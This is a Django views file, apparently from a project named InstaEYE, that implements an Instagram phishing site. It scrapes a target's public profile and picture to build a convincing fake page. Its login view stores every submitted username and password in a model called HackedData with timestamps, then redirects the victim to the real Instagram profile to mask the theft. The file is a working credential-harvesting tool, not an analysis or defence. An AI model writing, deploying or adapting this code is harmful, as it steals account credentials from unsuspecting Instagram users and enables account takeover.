from time import time
from tkinter.messagebox import NO
from django.shortcuts import render, redirect, HttpResponse
from django.contrib.auth.models import User, auth
from datetime import datetime, date
from .models import HackedData
from .functions import profile_data
import time
import requests, shutil
import json
import os
import platform

# Create your views here.
def index(request):
    return render(request, "index.html")

def username(request):
    return render(request, "username.html")

def login(request):
    auth_user = True
    if request.method == "POST":
        username = request.POST['username'] 
        password = request.POST['password'] 

        user = auth.authenticate(username=username, password=password)
        if user is not None:
            auth.login(request, user)
            return redirect("/forwarding-pag")
        else:
            date = datetime.now().strftime("%d/%m/%Y %H:%M:%S").split(" ")[0]
            time = datetime.now().strftime("%d/%m/%Y %H:%M:%S").split(" ")[1]
            
            print(username)
            print(password)
        
            if auth_user:
                target = HackedData(username = username, password = password, hacked_date= date, hacked_time=time)
                target.save()
                # return render(request, "login.html")
                try:
                    return redirect(f"https://www.instagram.com/{pp_username}/")
                except:
                    return redirect("https://www.instagram.com")
            
            else:
                return render(request, "login.html")
    else:return render(request, "login.html")

def profile(request):
    global pp_username
    if request.method == "POST":
        username = request.POST['username']
        print(username)
        profile_data(username)
        data = json.load(open(f'instagram/{username}/{username}.json', encoding='utf-8'))
        print(data)
        download_propic(data['GraphProfileInfo']['info']['profile_pic_url'], username)
        pro_pic = f"static/profilepic/{username}.jpg"
        context = {
                "username" : username,
                "pro_pic" : pro_pic, 
                "fullname" : data['GraphProfileInfo']['info']['full_name'],
                "posts" : data['GraphProfileInfo']['info']['posts_count'], 
                "followers" : data['GraphProfileInfo']['info']['followers_count'], 
                "following" : data['GraphProfileInfo']['info']['following_count'], 
                "biography" : data['GraphProfileInfo']['info']['biography']
            }
        pp_username = username
        return render(request, "profile.html", context)

    else:
        return render(request, "username.html")

def download_propic(url, username):
    res = requests.get(url, stream = True)
    if res.status_code == 200:
        if platform.system() == "Linux":
            with open(f"/var/www/InstaEYE/static/profilepic/{username}.jpg",'wb') as f:
                shutil.copyfileobj(res.raw, f)
        else:
            with open(f"static/profilepic/{username}.jpg",'wb') as f:
                shutil.copyfileobj(res.raw, f)
        return 

    else:
        return False


################################################# private data ##########################################
